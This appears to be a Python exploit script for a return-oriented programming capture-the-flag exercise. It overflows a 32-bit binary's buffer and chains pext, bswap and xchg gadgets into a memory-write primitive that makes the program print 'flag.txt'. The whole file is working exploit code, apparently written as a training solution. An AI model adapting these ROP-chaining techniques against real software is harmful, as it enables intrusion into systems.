#!/usr/bin/env python
import struct

def p(x):
    return struct.pack("<I", x)

# pext translation code that works. Im sure theres a more elegant way
def pext_translate(char, mask=0xb0bababa):
    mask = "{0:032b}".format(mask)
    char = "{0:08b}".format(ord(char)).ljust(32,".")
    ret = ""
    index = 0
    for m in mask:
        if m == char[index]:
            index += 1
            ret += "1"
        else:
            ret += "0"
    return int(ret,2)

# Memory locations
writeable_mem   = 0x0804a018    # All zeros, so no need to null-terminate
print_file      = p(0x080483d0) # address of print_file

# Gadgets: write/what/where
pext_edx = p(0x08048543) # mov eax, ebp ; mov ebx, 0xb0bababa ; pext edx, ebx, eax ; mov eax, 0xdeadbeef ; ret
xchg_ecx = p(0x08048555) # xchg byte ptr [ecx], dl ; ret
set_ecx  = p(0x08048558) # pop ecx ; bswap ecx ; ret
pop_ebp  = p(0x080485bb) # pop ebp ; ret

def write_primitive(addr, bytes):
    buf = ""
    for i,byte in enumerate(bytes):
        # ebp will get mov'd to eax
        buf += pop_ebp
        buf += p(pext_translate(byte))
        # ebp -> pext'd with 0xb0bababa -> byte in edx
        buf += pext_edx
        # set ecx to writeable address
        buf += set_ecx
        buf += struct.pack(">I", writeable_mem+i)
        # perform the write
        buf += xchg_ecx
    return buf

# Overflow
buf = 'A'*44

# Write "flag.txt" to memory.
buf += write_primitive(writeable_mem, "flag.txt")

# Call print_file
buf += print_file
buf += "JUNK"
buf += p(writeable_mem)

print(buf)
